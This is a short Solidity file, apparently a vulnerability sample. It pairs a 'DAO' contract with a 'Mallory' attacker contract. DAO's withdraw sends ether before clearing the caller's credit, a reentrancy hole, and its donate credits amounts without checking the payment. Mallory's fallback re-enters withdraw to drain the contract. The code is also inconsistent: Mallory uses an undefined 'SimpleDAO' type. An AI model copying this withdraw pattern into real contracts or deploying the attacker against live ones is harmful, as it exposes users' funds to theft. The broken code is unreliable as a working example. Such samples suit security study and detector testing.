1 1 pragma solidity >=0.4.24<0.6.0;
2 2 
3 3 contract DAO {
4 4     mapping (address => uint) public credit;
5 5     constructor() public {
6 6     }
7 7     function donate(address to, uint amount) payable public {
8 8         credit[to] += amount;
9 9     }
10 10     function queryCredit(address to) public view returns (uint) {
11 11         return credit[to];
12 12     }
13 13     function withdraw() public {
14 14         uint oldBal = address(this).balance; 
15 15         address payable sender = msg.sender;
16 16         uint balSender = msg.sender.balance; 
17 17         uint amount = credit[msg.sender];
18 18         if (amount > 0) {
19 19             sender.transfer(amount); 
20 20             credit[msg.sender] = 0;  
21 21         }
22 22         uint bal = address(this).balance;       
23 23     }
24 24 }
25 25 
26 26 contract Mallory {
27 27     SimpleDAO public dao;
28 28     uint count;
29 29     constructor (address daoAddr) public payable {
30 30         count = 0;
31 31         dao = SimpleDAO(daoAddr);
32 32     }
33 33     function () payable external {
34 34         if (count < 2) {
35 35             count ++;
36 36             dao.withdraw();
37 37         }
38 38     }
39 39     function donate() public {        
40 40         dao.donate(address(this), address(this).balance);  
41 41     }
42 42     function getJackpot() public {
43 43         dao.withdraw();
44 44     }
45 45 }  